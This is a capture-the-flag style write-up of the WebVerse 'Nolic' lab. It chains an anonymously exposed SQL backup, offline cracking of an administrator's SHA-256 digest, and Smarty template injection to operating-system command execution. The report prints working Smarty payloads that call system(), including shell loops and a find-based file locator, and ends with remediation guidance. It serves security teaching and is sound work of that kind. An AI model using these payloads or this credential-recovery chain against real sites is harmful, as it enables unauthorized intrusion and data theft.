---
title: "WebVerse Nolic — Exposed Backup to Smarty SSTI and Remote Code Execution"
date: 2026-08-04T00:00:00+02:00
lastmod: 2026-08-11T00:00:00+02:00
draft: false
author: "Mdk22"
description: "An anonymously exposed SQL backup enabled offline administrator credential recovery, followed by verified Smarty SSTI and operating-system command execution."
summary: "A public backup disclosed an administrator SHA-256 password digest. After bounded offline recovery, controlled Caido and browser validation confirmed Smarty template injection, operating-system command execution, an exact flag read, and restoration of the modified draft state."
categories:
  - "Web Security Write-Ups"
tags:
  - "WebVerse"
  - "Nolic"
  - "Smarty"
  - "Server-Side Template Injection"
  - "Remote Code Execution"
  - "PHP"
  - "Apache"
  - "SQLite"
  - "Password Hashing"
  - "Caido"
  - "CWE-1336"
  - "CWE-548"
  - "CWE-530"
  - "CWE-916"
  - "CWE-78"
platform: "WebVerse"
lab: "Nolic"
difficulty: "Easy"
showToc: true
TocOpen: false
case_id: "CASE-007"
case_status: "SOLVED / VERIFIED"
case_classification: "Authenticated Smarty SSTI to OS Command Execution"
case_family: "server-side-injection"
case_evidence:
  - "Caido"
  - "Chromium"
  - "Python"
case_verified: true
case_caido: true
case_independent_curl: false
primary_cwe: "CWE-1336"
cwes:
  - "CWE-1336"
  - "CWE-548"
  - "CWE-530"
  - "CWE-916"
  - "CWE-78"
patterns:
  - "Public Backup Exposure"
  - "Weak Password Storage"
  - "Server-Side Template Injection"
  - "Template-to-Command Execution"
  - "Sensitive Information Disclosure"
methods:
  - "Disclosed Route Follow-Up"
  - "Directory Enumeration"
  - "Source Inspection"
  - "Offline Hash Verification"
  - "Anonymous Replay"
  - "Invalid-versus-Valid Differential"
  - "Browser Runtime Validation"
  - "Bounded File Locator"
  - "Deterministic State Restoration"
  - "Authoritative Status Check"
---

> **Publication note:** This article documents a fresh reproduction in an authorized WebVerse educational lab. The recovered password and password digest are omitted, all session-cookie values are redacted, and the current-instance flag is represented as `WEBVERSE{REDACTED}`. Dynamic target, session, object, and secret-bearing values in the copyable reproduction blocks use stable placeholders.

## Executive Summary

The Nolic challenge combined several independent weaknesses into a complete external attack path. The canonical `robots.txt` disclosed a backup route, and the route returned an anonymous Apache directory index containing a downloadable SQL dump. The dump included an administrator account and a fast SHA-256 password representation. A bounded offline test recovered the weak password after 26 candidates without sending password guesses to the target.

The recovered credential established a valid administrative session. The dashboard identified one authoritative draft post, and its complete original state was captured before mutation. The authenticated draft route served as the rendering oracle: each bounded payload modified only the body, was observed while `status=draft` remained unchanged, and was followed by deterministic restoration of every original field.

Smarty evaluated a harmless arithmetic marker to `49`. A subsequent deterministic `system()` probe returned the operating-system-generated value `58597`, demonstrating command execution with the web application process's privileges. A bounded filename-only search identified one readable flag-shaped candidate; one exact, non-public read then returned the current-instance flag, which WebVerse accepted.

> **CONFIRMED FINDING**
>
> Attacker-controlled post content was compiled as Smarty template source and could invoke `system()`. Although the final sink required an authenticated editor, the application itself anonymously exposed the administrator password material needed to satisfy that precondition.

## 1. Report Profile

| FIELD | VALUE |
| --- | --- |
| Platform | WebVerse |
| Lab | Nolic |
| Difficulty | Easy |
| Status | Solved / Verified |
| Reproduction date | Fresh authorized instance |
| Target | `<LAB_ORIGIN>` / `<LAB_HOST>` |
| Primary weakness | Smarty Server-Side Template Injection |
| Verified impact | Authenticated operating-system command execution |
| Initial access | Anonymous SQL backup exposure and offline credential recovery |
| Primary CWE | CWE-1336 |

### Verified Attack Chain

```text
GET /robots.txt
  > /backups/, /admin/, and /login.php disclosed
GET /backups/
  > anonymous Apache directory index
GET /backups/nolic-backup-2025-06-01.sql
  > administrator username and SHA-256 password digest
Bounded offline candidate verification
  > password recovered after 26 candidates
POST /login.php
  > HTTP 302, NOLICSESS, /admin/dashboard.php
Dashboard mapping
  > one authoritative draft confirmed
Authenticated draft rendering
  > Smarty arithmetic renders 49
  > system("expr 31415 + 27182") renders 58597
Bounded filename-only locator
  > one readable flag-shaped candidate
Exact read and restoration
  > WEBVERSE{REDACTED}, original draft state restored
WebVerse submission
  > LAB SOLVED
```

## 2. Scope and Evidence Boundary

Testing was limited to the deliberately vulnerable Nolic instance and followed the established solution path rather than broad or unrelated enumeration.

- Password testing was performed offline against the digest already exposed by the backup; no online spraying was used.
- Template validation progressed from arithmetic evaluation to a harmless deterministic command before any file access.
- File discovery was constrained to selected roots, one filesystem, maximum depth 6, readable regular files, flag-shaped names, and 40 results.
- No reverse shell, persistence, destructive command, privilege escalation, or unrelated file collection was attempted.
- Temporary body changes were restored through a deterministic snapshot workflow; every verified probe kept `status=draft` unchanged.

Caido supplied the authoritative request and response evidence. Chromium confirmed the rendered Smarty, command, locator, and final flag behavior. Python performed offline digest verification and field-level restoration comparison.

## 3. Canonical Host and Public Route Disclosure

The fresh instance used `10.100.0.30`. Requesting the IP-based `robots.txt` route returned HTTP 301 with a `Location` header pointing to `http://nolic.local/robots.txt`. This established the active virtual host without relying on historical material.

![HTTP 301 redirect from the current instance IP to nolic.local robots.txt](Nolic_Figure_01_Canonical_Redirect.png)

**Figure 1 — Canonical host.** The current instance redirects the IP-based request to `nolic.local/robots.txt`.

The canonical file returned HTTP 200 and disclosed three routes:

```text
Disallow: /backups/
Disallow: /admin/
Disallow: /login.php
```

![robots.txt discloses backup, admin, and login routes](Nolic_Figure_02_Robots_Disclosure.png)

**Figure 2 — Route disclosure.** The file identifies relevant routes but is treated only as reconnaissance; exploitability required direct follow-up.

## 4. Anonymous Backup Exposure

`GET /backups/` returned HTTP 200 with an Apache directory index. It listed one SQL artifact, `nolic-backup-2025-06-01.sql`, without requiring authentication.

![Anonymous Apache directory index listing the Nolic SQL backup](Nolic_Figure_03_Backup_Directory_Listing.png)

**Figure 3 — Directory listing.** The backup filename and metadata were publicly browsable.

Requesting the exact listed file returned HTTP 200, `Content-Type: application/sql`, and a 16,294-byte database dump. The dump defined `admin_users`, `posts`, and `admin_sessions`. Its administrator record contained the username `wren` and a 64-character hexadecimal password digest; the digest is redacted from the public figure.

![Downloaded SQL backup with the administrator password digest redacted](Nolic_Figure_04_SQL_Backup_Credential_Record_REDACTED.png)

**Figure 4 — Backup contents.** The response proves anonymous retrieval of a real SQL dump and privileged credential material.

The directory index is mapped to CWE-548. The actual retrievable backup is mapped separately and more precisely to CWE-530; route disclosure alone would not have established backup exposure.

## 5. Bounded Offline Credential Recovery

The exposed digest was tested locally against `/usr/share/wordlists/rockyou.txt`. A SHA-256 match occurred after 26 candidates, and the recovered password was eight bytes long. No requests were sent to Nolic during this phase, and neither the digest nor plaintext password is published.

![Redacted offline SHA-256 verification output showing a match after 26 candidates](Nolic_Figure_05_Offline_SHA256_Recovery_REDACTED.png)

**Figure 5 — Offline verification.** The result establishes the algorithm and matching candidate without exposing the credential.

Digest shape was not used as the sole basis for calling it SHA-256. Reproducing the stored value with an actual SHA-256 candidate match confirmed the algorithm. The weakness is therefore mapped to CWE-916 rather than a generic credential category.

## 6. Authentication and Administrative Mapping

The login page submitted `username` and `password` to `POST /login.php`. One controlled login using the recovered credential returned HTTP 302, issued a `NOLICSESS` cookie, and redirected to `/admin/dashboard.php`. The cookie value is redacted.

![Successful login response with the NOLICSESS value redacted](Nolic_Figure_06_Login_Session_Response.png)

**Figure 6 — Authentication.** HTTP 302, session issuance, and the dashboard redirect prove that the offline-recovered credential was accepted.

The authenticated dashboard listed six posts: five published and one draft. The only draft was `id=6`, titled “Marginalia for the modern reader,” with slug `marginalia-for-the-modern-reader`.

![Dashboard response identifies post id 6 as the sole draft](Nolic_Figure_07_Draft_Post_Mapping.png)

**Figure 7 — Authoritative draft mapping.** The dashboard state prevented accidental modification of a published article.

## 7. Draft Baseline and Restoration Snapshot

The editor at `POST /admin/edit_post.php?id=6` exposed the fields `title`, `slug`, `excerpt`, `body`, `status`, and `tags`. The draft option was checked. Before mutation, every original value and `status=draft` was saved and hashed.

While the post remained a draft, the exact article slug returned HTTP 200 to the authenticated administrator and HTTP 404 when replayed without the session cookie. No separate preview endpoint, preview button, or JavaScript preview mechanism was required for the verified rendering workflow.

![Anonymous no-cookie replay returns HTTP 404 for the authenticated draft route](Nolic_Figure_08_Anonymous_Draft_Baseline.png)

**Figure 8 — Anonymous control.** The same draft route returned HTTP 404 without the session cookie.

This control established two facts at once: the draft was not anonymously exposed, and an authenticated administrator could use it as a rendering oracle. Every later probe retained `status=draft`, changed only the body, observed the authenticated rendering, and then restored the original field set.

## 8. Smarty Server-Side Template Injection

The first mutation appended a unique marker containing a harmless Smarty arithmetic expression while preserving the original title, slug, excerpt, and tags:

```smarty
<p>NOLIC_SSTI_A1_{math equation="7*7"}_END</p>
```

The authenticated draft response contained:

```text
NOLIC_SSTI_A1_49_END
```

The raw `{math ...}` source was absent from the rendered response.

![Smarty arithmetic expression evaluates to 49 in the article response](Nolic_Figure_09_Smarty_Arithmetic_Evaluation.png)

**Figure 9 — Template evaluation.** The deterministic `49` result distinguishes server-side template processing from storage, reflection, or ordinary HTML rendering.

After the observation, the complete original draft was restored and verified before continuing.

## 9. Operating-System Command Execution

The second mutation used a deterministic command with no file or state impact:

```smarty
<p>NOLIC_RCE_B1_{system('expr 31415 + 27182')}_END</p>
```

During authenticated draft rendering, the article rendered:

```text
NOLIC_RCE_B1_58597 58597_END
```

The value `58597` was not present in the stored source. PHP `system()` emits command output and returns its last output line, which explains the duplicated value when the function result is also rendered by the Smarty/PHP path.

![Browser-rendered deterministic operating-system command result](Nolic_Figure_10_OS_Command_Execution.png)

**Figure 10 — Command execution.** Dynamic operating-system output proves escalation from template evaluation to command execution with the web application process's privileges.

The test did not use a reverse shell, persistence mechanism, destructive command, or privilege escalation.

## 10. Bounded Flag Discovery

A short common-path allowlist was tested first. The command completion marker rendered, but no candidate was found. This negative control proved command execution without assuming a flag location.

A second locator searched only `/var/www`, `/opt`, `/app`, `/srv`, `/home`, `/tmp`, `/root`, and `/challenge`. It was constrained to one filesystem, maximum depth 6, readable regular files, flag-shaped filenames, and 40 results. File contents were not read during this phase.

The locator returned one readable flag-shaped candidate. Its current-instance path is intentionally omitted from this public update.

![Bounded filename-only locator identifies one readable flag-shaped candidate](Nolic_Figure_11_Bounded_Flag_Locator.png)

**Figure 11 — Bounded locator.** The result establishes a readable candidate path, not its content.

## 11. Reproduction Commands and Payloads

These blocks contain only requests, payloads, and local helpers that were actually used and verified during the authorized reproduction. The surrounding Caido, browser, and terminal figures remain the proof layer; these blocks are the reproducibility layer. No `curl` command was executed, so none is added retrospectively.

### R-01 — Canonical `robots.txt` request

```http
GET /robots.txt HTTP/1.1
Host: <LAB_HOST>
```

Expected semantic result: HTTP 200 on the canonical host with `Disallow` entries for `/backups/`, `/admin/`, and `/login.php`.

### R-02 / R-03 — Anonymous backup access

```http
GET /backups/ HTTP/1.1
Host: <LAB_HOST>
```

```http
GET /backups/nolic-backup-2025-06-01.sql HTTP/1.1
Host: <LAB_HOST>
```

The first request returned an Apache directory index. The second retrieved only the SQL artifact named by that listing.

### R-04 — Login request shape

```http
POST /login.php HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded

username=<REDACTED>&password=<REDACTED>
```

Expected semantic result: HTTP 302, a redacted `NOLICSESS` value, and the authenticated dashboard redirect.

### R-05 / R-06 — Authenticated baseline and anonymous control

```http
GET /post.php?slug=<REDACTED> HTTP/1.1
Host: <LAB_HOST>
Cookie: NOLICSESS=<SESSION_COOKIE>
```

```http
GET /post.php?slug=<REDACTED> HTTP/1.1
Host: <LAB_HOST>
```

The authenticated draft baseline returned HTTP 200. The equivalent no-cookie control returned HTTP 404.

### R-07 — Authenticated editor request shape

```http
POST /admin/edit_post.php?id=<OBJECT_ID> HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded
Cookie: NOLICSESS=<SESSION_COOKIE>

<title/slug/excerpt/body/status/tags form fields>&status=draft
```

Only the verified request contract is published; dynamic session, object, and original-form values remain placeholders.

### P-01 — Smarty arithmetic evaluation

```smarty
<p>NOLIC_SSTI_A1_{math equation="7*7"}_END</p>
```

Expected semantic result: `NOLIC_SSTI_A1_49_END`; raw Smarty syntax is absent from the rendered response.

### P-02 — Deterministic command-execution proof

```smarty
<p>NOLIC_RCE_B1_{system('expr 31415 + 27182')}_END</p>
```

Expected semantic result: dynamic result `58597` appears in the marker. This establishes command execution but not file location or readability.

### P-03 — Common-path negative control

```smarty
<pre>NOLIC_FLAG_C1_BEGIN {system('for p in /flag /flag.txt /root/flag /root/flag.txt /var/www/flag /var/www/flag.txt /var/www/html/flag /var/www/html/flag.txt /app/flag /app/flag.txt /opt/flag /opt/flag.txt; do [ -r "$p" ] && echo "NOLIC_COMMON_HIT:$p"; done; echo NOLIC_COMMON_DONE')} NOLIC_FLAG_C1_END</pre>
```

Expected semantic result: the completion marker renders with no common-path hit.

### P-04 — Bounded filename-only locator

```smarty
<pre>NOLIC_FLAG_D1_BEGIN {system('find /var/www /opt /app /srv /home /tmp /root /challenge -xdev -maxdepth 6 -type f -readable \( -iname flag -o -iname flag.txt -o -iname "*flag*" \) 2>/dev/null | head -n 40 | sed "s#^#NOLIC_FLAG_CANDIDATE:#"; echo NOLIC_LOCATOR_DONE')} NOLIC_FLAG_D1_END</pre>
```

Expected semantic result: at most 40 readable flag-shaped filenames are returned. The current-instance candidate path is omitted publicly.

### P-05 — Exact final read

The final payload read only the one candidate confirmed by P-04 and surrounded the result with a unique marker. Its exact current-instance path, secret-bearing command syntax, and returned flag are intentionally described rather than published. During authenticated rendering, the article returned HTTP 200 and a current-instance flag matching the expected WebVerse format. The public evidence replaces the complete value with `WEBVERSE{REDACTED}`.

![Public-safe exact flag read with the current-instance value redacted](Nolic_Figure_12_Final_Flag_Read_REDACTED.png)

**Figure 12 — Exact read.** The one candidate confirmed by the bounded locator returned the redacted current-instance flag between the controlled markers.

No further file contents or unrelated paths were read.

### C-01 to C-04 — Executed local helpers

```text
python3 Nolic_EV06_Offline_SHA256_Recovery.py
python3 Nolic_EV09_Create_Draft_Snapshot.py
python3 Nolic_EV12_Generate_Exact_Restore_Body.py
python3 Nolic_EV12_Verify_Draft_Restoration.py
```

These commands performed offline SHA-256 candidate testing, draft-state capture, deterministic restoration-body generation, and field-level restoration verification. They do not represent additional target-side requests.

## 12. Deterministic State Restoration

The original `title`, `slug`, `excerpt`, `body`, `tags`, and `status=draft` values were captured before the first payload. Restoration requests were generated from that snapshot rather than by manual editing. A fresh editor response was parsed after each captured cycle, and every field was compared by value, length, and SHA-256 digest.

![Field-level restoration verification for the modified Nolic draft](Nolic_Figure_13_Restoration_Verification.png)

**Figure 13 — Restoration verification.** All recorded fields match their original digests, the draft status is restored, no probe marker remains, and `restoration_verified=true`.

The deterministic mechanism was independently captured after the arithmetic, command-execution, common-path, and locator cycles. The same restore request was executed after the exact flag read, but a separate post-flag restoration screenshot was not retained because the evidence-upload limit had been reached. The final cleanup is therefore tester-attested; the article does not present Figure 13 as a separately captured post-flag restoration.

## 13. Authoritative Solved State

The recovered current-instance value was submitted to WebVerse. The platform accepted it and marked Nolic solved.

![WebVerse Nolic lab solved confirmation](Nolic_Figure_14_Solved_State.png)

**Figure 14 — Authoritative solved state.** WebVerse independently confirms that the final recovered value was correct for this instance.

## 14. Vulnerability Classification

| ROLE | CWE | EVIDENCE-BASED RELEVANCE |
| --- | --- | --- |
| Primary | CWE-1336 | Attacker-controlled post content was evaluated as Smarty template source. |
| Supporting | CWE-548 | Apache exposed an anonymous directory index for `/backups/`. |
| Supporting | CWE-530 | The listed SQL backup was directly downloadable without authentication. |
| Supporting | CWE-916 | A fast SHA-256 password representation enabled inexpensive offline guessing. |
| Consequence | CWE-78 | The injected Smarty expression invoked `system()` and returned dynamic OS command output. |

CWE-1336 is the primary mapping because unsafe template compilation was the decisive application weakness. CWE-78 records the demonstrated command-execution consequence. The backup and password mappings explain how an external actor obtained the authenticated precondition.

## 15. False-Positive Controls

The conclusion does not rely on a single response or assumption:

1. `robots.txt` was treated as reconnaissance until `/backups/` was requested directly.
2. The directory listing was separated from confirmed download of the exact SQL artifact.
3. Digest shape did not establish SHA-256; an actual offline candidate match did.
4. Recovered credentials were not considered valid until the application issued a session and loaded the dashboard.
5. Dashboard state and the checked editor value identified `id=6` as the real draft.
6. The no-cookie replay returned 404 while the authenticated draft baseline returned 200.
7. Arithmetic evaluation separated SSTI from reflection.
8. Dynamic OS-generated output separated command execution from a static marker.
9. A common-path negative control rejected assumed flag locations.
10. The bounded locator returned only filenames; file content was read in a separate final step.
11. Captured restoration cycles used full field equality rather than visual inspection.
12. WebVerse independently accepted the recovered flag.

## 16. Impact

The verified chain provides an external attacker with a path from anonymous access to operating-system command execution. Once authenticated, the attacker can execute commands with the privileges of the web application process. The confirmed reproduction demonstrated access to one readable flag file.

In a production environment, plausible consequences could include reading application secrets, environment variables, source code, database credentials, or other files accessible to the service account; modifying hosted content; or establishing persistence if permissions allow. Those broader outcomes were not tested and are not presented as confirmed effects.

The individual findings vary in severity, but the complete anonymous-backup-to-command-execution chain warrants critical treatment. The authentication requirement does not materially break the external path because the application exposed the password material used to obtain that session.

## 17. Remediation

### Remove Backups From the Web Tier

Store database dumps outside publicly served directories in access-controlled backup infrastructure. Add deployment checks for `.sql`, `.db`, `.sqlite`, `.bak`, `.dump`, `.zip`, and archive files. Disable Apache directory indexing as defense in depth, not as a substitute for removing public files.

### Modernize Credential Storage

Replace general-purpose SHA-256 password storage with Argon2id or another reviewed password-specific KDF using unique salts and an appropriate work factor. Force credential resets after any backup exposure and enforce strong passwords, breached-password screening, rate limiting, monitoring, and multi-factor authentication.

### Treat Post Content Strictly as Data

Assign stored post content as data inside a fixed Smarty template. Do not compile database-controlled body text through string templates or equivalent dynamic template APIs. Sanitize permitted rich-text HTML with an allowlist while ensuring template syntax never reaches the Smarty compiler.

### Restrict Template and Process Capabilities

Enable a restrictive Smarty security policy and allowlist only required functions. Remove access to `system`, `exec`, `shell_exec`, `passthru`, `proc_open`, and related primitives. Run the application as a dedicated least-privileged service account that cannot traverse or read unrelated home directories; add AppArmor, SELinux, container, or equivalent confinement where appropriate.

## 18. Validation After the Fix

- `/backups/` and the former SQL URL should be unreachable or return a non-disclosing denial.
- Deployment artifacts and the web root should contain no backup or database exports.
- Password records should use the intended KDF; legacy SHA-256 records should be invalidated or rehashed after verified login.
- Harmless Smarty syntax submitted through the editor should render literally or be safely encoded.
- Template-callable functions should be unable to spawn operating-system processes.
- The web-service account should be unable to traverse or read unrelated user home directories.
- Published and draft posts should preserve their intended access behavior for authenticated and anonymous clients.

## Conclusion

Nolic demonstrated how public backup exposure, weak password storage, and unsafe template rendering can amplify one another. The evidence supports each transition independently: exact backup retrieval, offline digest verification, accepted authentication, authoritative draft selection, arithmetic template evaluation, dynamic command output, bounded file discovery, exact read, deterministic restoration, and platform acceptance.

The highest-priority fixes are to remove backups from the web tier and stop compiling untrusted post content as Smarty source. Either control would break a major portion of the observed chain; both are required alongside modern password hashing and least-privilege process isolation for a robust remediation.
